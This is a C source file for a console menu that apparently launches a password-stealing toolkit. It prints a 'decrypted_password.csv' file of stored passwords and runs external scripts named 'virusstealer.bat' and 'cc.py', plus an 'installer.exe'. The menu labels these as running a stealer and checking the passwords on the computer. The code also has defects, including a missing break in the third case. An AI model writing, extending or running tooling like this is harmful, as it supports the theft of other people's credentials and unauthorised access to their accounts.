
#include <stdio.h>
#include <stdlib.h> 
#include <string.h>

// Function to open a file and display its contents
void openFile() {
    FILE *file = fopen("decrypted_password.csv", "r");
    if (file != NULL) {
        char line[1000000];
        while (fgets(line, sizeof(line), file)) {
            printf("%s", line);
        }
        fclose(file);
    } else {
        printf("Error opening file.\n");
    }
}

// Function to run a batch file
void runBatchFile() {
    system("virusstealer.bat");
}
void runInstaller() {
    system("installer.exe");
}
void runPrinter() { 
    system("cc.py");
}
int main() {
    int choice;
    printf("Choose an option:\n");
    printf("1. Open current passwords stored.\n");
    printf("2. Run Stealer File\n");
    printf("3. Check passwords on this computer\n");
    scanf("%d", &choice);

    switch (choice) {
        case 1:
            openFile();
            break;
        case 2:
            runBatchFile();
            break;
        case 3:
            runPrinter();
        default:
            printf("Invalid choice.\n");
            break;
    }
     //exit code
    printf ("Press any key to exit...\n");
    char exit[2];
    scanf ("%s", exit);
    return 0;

}
